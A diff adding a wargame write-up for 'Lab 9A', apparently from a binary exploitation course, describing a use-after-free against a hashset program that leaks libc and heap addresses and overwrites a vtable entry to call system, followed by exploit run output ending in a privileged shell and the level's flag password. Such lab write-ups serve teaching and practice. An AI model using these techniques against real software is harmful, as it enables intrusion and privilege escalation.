@@ -592,3 +592,37 @@ uid=1033(lab9C) gid=1034(lab9C) euid=1034(lab9A) groups=1035(lab9A),1001(gameuse
 $ cat ~lab9A/.pass
 1_th0uGht_th4t_w4rn1ng_wa5_l4m3
 ```
+
+### Lab 9A
+
+* A hashset implementation, whose hashfunc is defined in a simple callable class instance.
+* The hash function just returns the number itself.
+* Allows you to allocate unlimited `hashset_int`s, into one of 8 slots.
+* We can allocate an array of ints of any size when we create a hash set.
+* Use after free.
+* We want to allocated a few hashsets, free them, and then allocate a larger one over the old ones so that we can control the vtable pointer.
+* Need to leak both libc (for `system`) and the heap address.
+* Want to overwrite the `add` method in the vtable.
+* Because the `this` argument is implicit, but we control the second, we need to jump farther into `system` so that the stack is offset by four.
+  * `system` + 1 is perfect.
+* Worked on this with uafio.
+* See _lab9A.py_.
+
+```bash
+lab9A@warzone:/levels/lab09$ python /tmp/lab9A.py
+[*] For remote: /tmp/lab9A.py HOST PORT
+[+] Starting program '/levels/lab09/lab9A': Done
+[*] [3504]
+[*] Paused (press any to continue)
+[*] leak_libc: 0xb7639450
+[*] leak_heap: 0x9c38888
+[*] system magic: 0xb74cf191
+[*] Vtable addr: 0x9c38080
+[*] Using size 1361
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+$ id
+uid=1034(lab9A) gid=1035(lab9A) euid=1035(lab9end) groups=1036(lab9end),1001(gameuser),1035(lab9A)
+$ cat ~lab9end/.pass
+1_d1dNt_3v3n_n33d_4_Hilti_DD350
+```
